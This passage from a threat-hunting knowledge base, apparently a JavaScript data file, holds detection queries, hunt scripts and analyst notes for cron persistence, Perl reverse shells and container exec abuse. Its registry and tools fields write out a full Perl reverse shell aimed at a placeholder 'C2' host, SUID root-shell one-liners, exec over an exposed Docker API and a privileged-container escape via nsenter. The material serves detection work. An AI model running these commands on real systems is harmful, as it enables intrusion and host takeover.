  ~/.config/systemd/user/*.timer  (user timers)

Logs:
  /var/log/cron , /var/log/syslog (cron execution lines)
  journalctl -u cron / journalctl -u crond

Investigation pivots:
- Any cron entry invoking curl/wget/base64, a reverse
  shell, or a payload in /tmp,/dev/shm is the signature
- @reboot entries (run at boot) are favored for persistence
- Dot-prefixed or odd-named files in /etc/cron.d
- A user crontab for an account that shouldn't have one
  (service accounts, nologin users)
- systemd .timer pointing at a .service that runs a
  writable-path binary`,
        tools: `Built-in: crontab -e / direct file writes (no tooling
  needed - cron abuse is a few lines)
Metasploit - cron persistence modules
Empire / Sliver Linux persistence modules
LinPEAS / linux-smart-enumeration - flag writable cron
  files and misconfigured cron (recon)
GTFOBins - entries abusing cron-invoked SUID helpers
Manual operators - @reboot cron and /etc/cron.d drops are
  among the most common Linux persistence/exec methods`,
        ossdetect: `Sigma (Linux rules):
- lnx_auditd_cron_file_modification.yml
- lnx_cron_susp_command.yml
- lnx_systemd_timer_creation.yml

Atomic Red Team:
- T1053.003 (cron job tests)

Auditd:
- -w watches on /etc/crontab, /etc/cron.d/, /var/spool/cron

Sysmon for Linux:
- FileCreate (EID 11) on cron paths; ProcessCreate (EID 1)
  for cron-spawned children

Falco:
- "Schedule Cron Jobs" / write-below-etc rules

Velociraptor:
- Linux.Sys.Crontab artifact (fleet-wide cron enumeration)`,
        notes: "Cron is both an execution and a persistence technique; this row focuses on detecting the abuse, and it pairs with the eventual Linux persistence coverage. The detection surface is broad because cron has many homes - the master /etc/crontab, drop-in files in /etc/cron.d, the script directories (/etc/cron.hourly|daily|weekly|monthly), per-user spools (/var/spool/cron on RHEL, /var/spool/cron/crontabs on Debian), and increasingly systemd .timer units which are the modern replacement and easy to overlook. Two detection angles: file modification on any of those locations (auditd watch rules keyed for easy searching, or Sysmon for Linux EID 11), and cron-spawned children that are suspicious (cron/crond as parent of a shell, python, curl, or a /tmp payload). The content tells are the same as elsewhere - curl/wget/base64, reverse shells, payloads in writable paths - plus the cron-specific @reboot directive favored for boot persistence. The proactive play is a full cron enumeration sweep across all users and all locations including systemd timers, flagging any entry that invokes a downloader, a shell, or a writable-path binary, and any crontab belonging to a service/nologin account that shouldn't have one. This needs auditd watch rules on the cron paths to catch reliably in real time - note that as a prerequisite. Baseline legitimate scheduled maintenance (logrotate, package-update timers, monitoring agents) before alerting.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Cron-based execution and persistence on compromised Linux servers documented across operations." },
          { cls: "apt-ru", name: "APT28", note: "Cron persistence used to maintain access on Linux infrastructure." },
          { cls: "apt-mul", name: "TeamTNT / Kinsing", note: "Cron (esp. /etc/cron.d and @reboot) is the staple persistence/re-exec for Linux cryptojacking worms." },
          { cls: "apt-mul", name: "Rocke / 8220 Gang", note: "Cron-based re-infection loops are signature behavior for Linux coinminer crews." },
        ],
        cite: "MITRE ATT&CK T1053.003",
      }
    ]
  }
,
  {
    id: "T1059",
    name: "Command and Scripting Interpreter: Perl / Legacy Interpreters",
    desc: "Perl one-liner reverse shells (-e with Socket/exec), CGI-era webshell execution, and interpreter execution from /tmp or web-accessible paths — primarily relevant on legacy Linux servers and OT-adjacent infrastructure where perl is available",
    rows: [
      {
        sub: "T1059 - Perl Reverse Shell and One-Liner Execution",
        os: "linux",
        indicator: "perl invoked with -e inline code containing socket/exec patterns, or executing a script from /tmp or /dev/shm — perl reverse shells are common on legacy Linux servers and in CGI exploitation chains where perl is present",
        sysmon: `// Sysmon for Linux EID 1 (ProcessCreate)
EventID=1
Image=(*perl OR */usr/bin/perl)
CommandLine matches:
  *-e* AND (*socket* OR *exec */bin/sh* OR *exec "/bin/bash"*)
  *-e* AND (*STDIN* OR *STDOUT* OR *STDERR*)   (fd dup pattern)
  *-e* AND (*fork* OR *connect*)
  *-e* AND (*use Socket* OR *use POSIX*)

// Perl executing a script from writable/temp path
CommandLine matches:
  */tmp/*.pl  OR  */dev/shm/*.pl  OR  */var/tmp/*.pl

// Perl spawned by web server (webshell/CGI execution)
// Same parent check as T1059.004 web-spawn:
ParentImage matches (*httpd* OR *nginx* OR *php* OR *apache*)
AND Image matches *perl

// Sysmon for Linux EID 3 (NetworkConnect) from perl
// perl process establishing outbound connection`,
        kibana: `// Perl inline execution with socket/shell patterns
process.name: "perl"
AND process.command_line: (*-e* AND (*socket* OR *exec* AND (*bash* OR */bin/sh*)))

// Perl running script from suspicious path
process.name: "perl"
AND process.command_line: (*/tmp/* OR */dev/shm/* OR */var/tmp/*)
AND process.command_line: *.pl*

// Perl spawned by web process (CGI / webshell)
process.name: "perl"
AND process.parent.name: (
  "httpd" OR "apache2" OR "nginx" OR "lighttpd" OR "php-fpm"
)

// Network connection from perl process
event.code: "3"
AND process.name: "perl"
AND NOT destination.ip: ("127.0.0.1" OR "::1")

// Sysmon EID 1 - perl with shell exec
event.code: "1"
AND process.executable: *perl
AND process.command_line: (*-e* AND (*socket* OR *exec*))`,
        powershell: `#!/bin/bash
# T1059 Perl - reverse shell and execution hunt

echo "[*] === auditd: perl with -e socket/exec patterns ==="
ausearch -k exec -i 2>/dev/null | \\
  grep perl | grep -E "(-e.*socket|-e.*exec.*sh|-e.*fork)" | tail -30

echo ""
echo "[*] === Live perl processes ==="
ps -eo pid,ppid,user,comm,args 2>/dev/null | grep perl | grep -v "grep"

echo ""
echo "[*] === perl processes with network connections ==="
for pid in $(pgrep -x perl 2>/dev/null); do
  conns=$(ss -tp 2>/dev/null | grep "pid=$pid,")
  if [ -n "$conns" ]; then
    echo "[FLAG] perl PID $pid has network connection:"
    echo "  CMD: $(tr '\\0' ' ' < /proc/$pid/cmdline)"
    echo "  CONN: $conns"
  fi
done

echo ""
echo "[*] === perl scripts in suspicious paths ==="
find /tmp /dev/shm /var/tmp -name "*.pl" 2>/dev/null | \\
  while read f; do
    echo "[FLAG] $f"
    head -5 "$f"
  done

echo ""
echo "[*] === Web CGI perl scripts (non-package) ==="
find /usr/lib/cgi-bin /var/www/cgi-bin -name "*.pl" 2>/dev/null | \\
  while read f; do
    pkg=$(dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null)
    [ -z "$pkg" ] && echo "[FLAG] Non-packaged CGI perl: $f"
  done`,
        registry: `Perl execution artifacts:

Perl binary locations:
  /usr/bin/perl
  /usr/local/bin/perl (custom install)

Script locations to watch:
  /tmp/*.pl , /dev/shm/*.pl , /var/tmp/*.pl
  /usr/lib/cgi-bin/*.pl        - CGI scripts
  /var/www/cgi-bin/*.pl        - web CGI
  /var/www/html/**/*.pl        - web-accessible perl

History artifacts:
  ~/.bash_history              - perl -e invocations logged
  /var/log/apache2/access.log  - CGI perl calls via HTTP

Canonical Perl reverse shell (PentestMonkey):
  perl -e 'use Socket;$i="C2";$p=4444;
    socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
    connect(S,sockaddr_in($p,inet_aton($i)));
    open(STDIN,">&S"); open(STDOUT,">&S");
    open(STDERR,">&S"); exec("/bin/sh -i");'

Perl SUID execution:
  perl -e 'exec "/bin/sh";' (if perl has SUID bit)
  perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

Legacy webshell pattern:
  CGI-era: HTTP POST to /cgi-bin/victim.pl → shell spawn
  Still found on legacy Apache/RHEL6 systems`,
        tools: `Perl in attack tooling and APT campaigns:

Historical prevalence:
  Perl was the dominant scripting language for Linux
  webshells and backdoors from ~2000 to ~2015.
  Many legacy Linux servers still have perl installed
  and many legacy exploits use perl payloads.

Active use today:
  - CGI exploitation chains on legacy Apache/RHEL systems
  - Post-exploitation when python is absent but perl exists
  - Some older APT toolkits include perl components

Perl webshell families:
  r57shell, c99shell (PHP but often paired with perl CGI)
  Older Linux webshells frequently written in Perl
  Still encountered on RHEL6/CentOS6 systems in OT/legacy env

PentestMonkey reverse shells:
  pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  Perl reverse shell is one of the primary documented variants

Known APT perl use:
  Various Iran-nexus actors have used perl post-exploitation
  scripts on compromised Linux infrastructure
  Older Lazarus tooling included perl components
  Legacy Linux worms (Slapper, Adore) written in perl

Detection note:
  perl -e with socket and exec is effectively the same
  signal quality as python -c with socket and pty.spawn.
  Alert threshold should be identical.`,
        ossdetect: `Sigma rules:
- proc_creation_lnx_perl_reverse_shell.yml
- proc_creation_lnx_perl_susp_execution.yml
- proc_creation_lnx_webserver_spawn_perl.yml

Elastic:
- Perl Reverse Shell Execution
- Web Server Spawning Perl Process

Atomic Red Team:
  T1059 parent tests include Perl one-liner variants

auditd + ausearch:
  ausearch -k exec -i | grep perl | \\
    grep -E "socket|exec.*sh|fork"

Falco:
  rule: Perl Shell Spawned by Web Process
  (adapt the existing web_server_binaries rule for perl)

Note: Perl detection is lower-coverage in OSS rules than
python because it is less prevalent in modern environments.
Custom Sigma rules are recommended for environments with
legacy perl-heavy infrastructure.`,
        notes: "Perl reverse shells are a legacy technique that remains relevant on any Linux server where Perl is installed (which is most RHEL 6/7 and many Ubuntu systems). While Python has largely displaced Perl in modern attack tooling, Perl payloads are still encountered in exploitation of legacy CGI-era web applications, older OT-adjacent Linux systems, and situations where Python is absent but Perl is available. The canonical PentestMonkey Perl reverse shell is well-known and should be treated as a high-confidence alert: use Socket, fork, and exec /bin/sh in the same perl -e invocation with an outbound network connection is near-certain exploitation. For environments with legacy RHEL 6 or CentOS 6 systems - particularly common in OT/ICS adjacent networks - Perl webshell detection deserves priority attention because those systems often run Apache with CGI enabled and have perl in /usr/bin.",
        apt: [
          { cls: "apt-ir", name: "Iran-nexus actors", note: "Perl post-exploitation scripts documented on compromised Linux infrastructure in multiple campaigns." },
          { cls: "apt-kp", name: "Lazarus", note: "Older Lazarus tooling included Perl components; encountered on legacy Linux server targets." },
          { cls: "apt-mul", name: "Legacy web exploiters", note: "Perl reverse shells standard in CGI-era exploitation chains; still encountered on RHEL6/CentOS6 and legacy Apache systems." }
        ],
        cite: "MITRE ATT&CK T1059"
      }
    ]
  },
  {
    id: "T1059.012",
    name: "Command and Scripting Interpreter: Container Administration Command",
    desc: "docker exec / kubectl exec / nsenter / crictl exec to spawn interactive shells inside running containers — lateral movement between containers and container-to-host pivot via privileged container exec chains",
    rows: [
      {
        sub: "T1059.012 - Container Shell via docker exec / kubectl exec / nsenter",
        os: "linux",
        indicator: "docker exec, kubectl exec, or nsenter used to spawn an interactive shell inside a running container from the host — grants execution context inside the container, potentially bypassing container-level security controls or pivoting into a privileged container",
        sysmon: `// Sysmon for Linux EID 1 (ProcessCreate)

// docker exec spawning shell inside container
Image=*/docker AND CommandLine matches:
  *exec* AND (*bash* OR */bin/sh* OR *-it* OR *-i*)
  *exec -it* AND (*bash* OR *sh* OR *ash* OR *dash*)

// kubectl exec into pod
Image=(*kubectl OR */kubectl) AND CommandLine matches:
  *exec* AND (*-- bash* OR *-- sh* OR *-- /bin/sh*)
  *exec* -it* AND *-- *

// nsenter (direct host namespace entry into container)
Image=*/nsenter AND CommandLine matches:
  *--target* OR *-t * (targeting a specific PID)
  *--mount* OR *-m*   (entering mount namespace)
  *--pid* OR *-p*     (entering PID namespace)
  (any nsenter is suspicious if not from known admin tools)

// crictl exec (containerd / CRI-O)
Image=(*crictl) AND CommandLine matches:
  *exec* AND (*-i* OR *-t* OR *bash* OR *sh*)

// runc exec (OCI runtime direct execution)
Image=*/runc AND CommandLine matches: *exec*`,
        kibana: `// docker exec spawning interactive shell
process.name: "docker"
AND process.command_line: (*exec* AND (*bash* OR *sh* OR *-it* OR *-i* AND *-t*))

// kubectl exec into pod shell
process.name: "kubectl"
AND process.command_line: (*exec* AND (*-- bash* OR *-- sh* OR *-- /bin/sh*))

// nsenter (namespace entry from host into container)
process.name: "nsenter"
AND process.command_line: (*--target* OR *-t *)

// crictl exec (containerd/CRI-O runtime)
process.name: "crictl"
AND process.command_line: (*exec* AND (*-i* OR *-t*))

// Shell spawned inside container with suspicious parent
// (visible from host-side Sysmon/auditd if using host PID namespace)
process.parent.name: ("containerd-shim" OR "runc" OR "crun")
AND process.name: ("bash" OR "sh" OR "dash")

// Kubernetes audit log: exec into pod
// (separate k8s audit pipeline)
kubernetes.audit.verb: "create"
AND kubernetes.audit.objectRef.subresource: "exec"
AND kubernetes.audit.requestObject.command: (*bash* OR *sh*)`,
        powershell: `#!/bin/bash
# T1059.012 - Container exec shell hunt

echo "[*] === Running containers ==="
docker ps --format 'table {{.ID}}\\t{{.Image}}\\t{{.Command}}\\t{{.Status}}' \\
  2>/dev/null || echo "Docker not available or not root"

echo ""
echo "[*] === docker exec events in auditd (today) ==="
ausearch -k exec -i --start today 2>/dev/null | \\
  grep "docker exec" | tail -20

echo ""
echo "[*] === Shells running inside containers (host view) ==="
# Processes in container namespaces visible from host
for pid in $(pgrep -x bash) $(pgrep -x sh) $(pgrep -x dash); do
  # Check if PID is in a container namespace
  host_ns=$(readlink /proc/1/ns/mnt 2>/dev/null)
  pid_ns=$(readlink /proc/$pid/ns/mnt 2>/dev/null)
  if [ "$host_ns" != "$pid_ns" ] && [ -n "$pid_ns" ]; then
    echo "[FLAG] Shell in non-host namespace: PID $pid"
    echo "  CMD: $(tr '\\0' ' ' < /proc/$pid/cmdline)"
    echo "  User: $(stat -c '%U' /proc/$pid 2>/dev/null)"
  fi
done

echo ""
echo "[*] === nsenter events ==="
ausearch -k exec -i --start today 2>/dev/null | \\
  grep nsenter | tail -20

echo ""
echo "[*] === kubectl exec history ==="
grep -r "kubectl.*exec" /root/.bash_history /home/*/.bash_history \\
  2>/dev/null | tail -20

echo ""
echo "[*] === Privileged containers (potential breakout) ==="
docker inspect \\
  $(docker ps -q 2>/dev/null) 2>/dev/null | \\
  python3 -c "
import sys, json
data = json.load(sys.stdin)
for c in data:
  name = c.get('Name','?')
  priv = c.get('HostConfig',{}).get('Privileged', False)
  caps = c.get('HostConfig',{}).get('CapAdd', [])
  mounts = [m for m in c.get('Mounts',[]) if m.get('Source','')=='/']
  if priv or 'SYS_ADMIN' in (caps or []) or mounts:
    print(f'[FLAG] {name}: Privileged={priv} CapAdd={caps} HostMounts={mounts}')
" 2>/dev/null`,
        registry: `Container exec artifacts:

Docker host artifacts:
  /var/lib/docker/             - container storage
  /var/log/syslog              - dockerd daemon log
  Docker event log:
    docker events --filter type=exec  (live)
    (no persistent exec log without audit plugin)

Container runtime logs:
  /var/log/containers/*.log    - Kubernetes container logs
  /var/log/pods/               - Pod-level logs (k8s)
  journalctl -u docker         - dockerd service log

Kubernetes audit log (separate pipeline):
  API server audit log records:
    verb: create
    resource: pods
    subresource: exec
  This is the primary kubectl exec audit trail.
  Requires kube-apiserver --audit-log-path= config.

nsenter targets:
  nsenter --target <PID> --mount --pid
  Any nsenter invocation targeting the init PID (1) of
  a container is entering the container's namespaces

Host-side process namespace check:
  readlink /proc/<pid>/ns/mnt  - mount namespace ID
  Processes not in host mount namespace = container

Privileged container indicators (escape risk):
  docker inspect --format '{{.HostConfig.Privileged}}'
  Privileged containers can trivially escape to host.
  Also check: --cap-add SYS_ADMIN, --pid=host, -v /:/host`,
        tools: `Container exec abuse in intrusions:

TeamTNT (mul) - cloud/container threat actor;
  docker exec used to move laterally between containers
  on compromised Docker daemon hosts; documented use of
  exposed Docker API for container-to-host pivot

Kinsing (mul) - cryptominer; exploits exposed Docker API
  (port 2375) to run containers and exec into them;
  also uses kubectl exec on misconfigured clusters

Hildegard (mul) - cloud-targeted threat actor;
  kubectl exec into running pods for lateral movement

Siloscape (mul) - Windows container escaper but illustrates
  the container exec → host pivot pattern

Common attack vectors:
  1. Exposed Docker daemon API (port 2375, no TLS):
     docker -H tcp://target:2375 exec -it <id> /bin/sh
  2. Compromised host → docker exec into app container
  3. kubectl exec via compromised service account token
  4. nsenter from host into container PID namespace
     (requires CAP_SYS_ADMIN or root on host)

Privileged container escape:
  docker run --privileged → nsenter --target 1
  --mount --pid --net gives full host access
  mount /dev/<disk> /mnt && chroot /mnt  (host FS access)

Detection gap:
  docker exec does not generate an auditd execve event
  for the command inside the container by default.
  Host-side: only the docker exec call itself is visible.
  Container-side: requires runtime security (Falco, sysdig)
  or Kubernetes audit log for kubectl exec.`,
        ossdetect: `Sigma rules:
- proc_creation_lnx_docker_exec_shell.yml
- proc_creation_lnx_kubectl_exec.yml
- proc_creation_lnx_nsenter_host_pivot.yml
- proc_creation_lnx_crictl_exec.yml

Falco (built-in rules for container security):
  rule: Terminal Shell in Container
    condition: spawned_process and container
      and shell_procs and proc.tty != 0
  rule: Attach to Running Container
    (detects docker attach and exec)
  Most relevant runtime security tool for this technique.

Kubernetes audit log (k8s environments):
  Configure kube-apiserver audit policy to log:
    - resources: [pods/exec]
      verbs: [create]
  Feed to SIEM for kubectl exec alerting

Elastic:
- Container Shell Execution
- Kubernetes Pod Exec

Wazuh:
  Docker integration module logs exec events
  Configure active response on exec + shell pattern

auditd (host-side):
  -a always,exit -F arch=b64 -S execve \\
    -F path=/usr/bin/docker -k docker_exec
  -a always,exit -F arch=b64 -S execve \\
    -F path=/usr/bin/nsenter -k nsenter_exec
  ausearch -k docker_exec --start today | grep exec

Velociraptor:
  Linux.Detection.ContainerExec
  Custom VQL for docker exec events`,
        notes: "Container administration exec commands (docker exec, kubectl exec, nsenter) are legitimate DevOps tools that also serve as primary lateral movement and post-exploitation mechanisms in containerized environments. The detection challenge is distinguishing authorized administrator use from attacker use: both generate identical process artifacts. Context is the key discriminator - alert on docker exec spawning a shell (bash/sh/dash) outside of expected maintenance windows, from unexpected source IPs or users, or targeting containers that should not have interactive sessions (databases, queue workers, monitoring agents). nsenter is especially powerful for attackers on the host: it allows entering a container's namespaces directly using the container's PID, bypassing the container runtime entirely, and requires only root or CAP_SYS_ADMIN on the host. The most dangerous scenario for detection purposes is a privileged container: any host-side exec into a privileged container, combined with nsenter --target 1 inside it, achieves full host root access. Falco provides the best real-time detection for container-side shell spawn; the Kubernetes audit log is the authoritative source for kubectl exec events.",
        apt: [
          { cls: "apt-mul", name: "TeamTNT", note: "Cloud/container threat actor; documented use of docker exec for lateral movement between containers on compromised Docker hosts." },
          { cls: "apt-mul", name: "Kinsing / Hildegard", note: "Cloud-targeted cryptominers; kubectl exec and docker exec used to run payloads in container environments." },
          { cls: "apt-mul", name: "Container escape operators", note: "Privileged container exec chains (docker exec → nsenter --target 1) documented as container-to-host pivot across multiple campaigns." }
        ],
        cite: "MITRE ATT&CK T1059.012"
      }
    ]
  }
];
